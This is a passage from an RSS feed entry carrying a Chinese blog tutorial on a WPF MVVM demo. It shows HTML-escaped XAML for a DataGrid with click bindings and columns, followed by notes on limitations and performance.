                &amp;lt;MouseBinding Gesture=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LeftDoubleClick&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Command=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding DgDoubleClick}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; 
                              CommandParameter&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding ElementName=DgTimes, Path=SelectedItem}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;&amp;lt;!--双击事件--&amp;gt;
                &amp;lt;MouseBinding Gesture=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LeftClick&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Command=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding DgClick}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
                              CommandParameter&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding ElementName=DgTimes, Path=SelectedItem}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;&amp;lt;!--单击事件，也可以写在SelectedItem选中事件中--&amp;gt;
            &amp;lt;/DataGrid.InputBindings&amp;gt;
            &amp;lt;DataGrid.Columns&amp;gt;
                &amp;lt;DataGridTextColumn Header=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;序号&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Binding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding RowIndex}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
                &amp;lt;DataGridTemplateColumn Header=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;勾选？&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; MinWidth=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
                    &amp;lt;DataGridTemplateColumn.CellTemplate&amp;gt;
                        &amp;lt;DataTemplate&amp;gt;
                            &amp;lt;Grid&amp;gt;
                                &amp;lt;Image Width=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Height=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Source=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding Photo}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;&amp;lt;!--图片的绑定--&amp;gt;
                            &amp;lt;/Grid&amp;gt;
                        &amp;lt;/DataTemplate&amp;gt;
                    &amp;lt;/DataGridTemplateColumn.CellTemplate&amp;gt;
                &amp;lt;/DataGridTemplateColumn&amp;gt;
                &amp;lt;DataGridTextColumn Header=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;输入内容&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Binding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding AddContent}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
                &amp;lt;DataGridTextColumn Header=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;时间&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; Binding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Binding AddTime}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
            &amp;lt;/DataGrid.Columns&amp;gt;
        &amp;lt;/DataGrid&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　5. 执行效果；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1317220/201802/1317220-20180222174150635-523244462.gif&quot; alt=&quot;&quot; width=&quot;1000&quot;/&gt;&lt;/p&gt;

&lt;p&gt;五、注意事项&lt;/p&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;本次项目制作并没有使用数据库的操作；源代码中也是没有！&lt;/p&gt;
&lt;p&gt;源码中包括了对输入框限制数字的输入方法；&lt;/p&gt;
&lt;p&gt;源码中包括了Button，TextBox，CheckBox，DataGrid等等样式资源代码；&lt;/p&gt;
&lt;p&gt;有些网友推荐 MVVMLight 或者 Prism 等第三方MVVM框架引用；&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;WPF做动画效果会很耗电脑资源，并且不会有性能优化；&lt;br/&gt;WPF使用异步的时候注意回到前端主线程才可以调用前端属性；&lt;br/&gt;MVVM只是推荐使用，要结合业务需求灵活变动使用，不是硬性规范；&lt;br/&gt;使用第三方控件和自定义属性会导致开发时界面灰掉；(暂时没找到解决方案)&lt;br/&gt;DataGrid加载不明确的图片，会加载超级慢;DataGrid默认开启数据虚化，会导致滚动条加载慢；&lt;/p&gt;
&lt;/blockquote&gt;


&lt;p&gt;&lt;code&gt; &lt;/code&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 22 Feb 2018 10:12:00 +0000</pubDate>
<dc:creator>叶耶①</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yjwlogs/p/8459751.html</dc:identifier>
</item>
</channel>
</rss>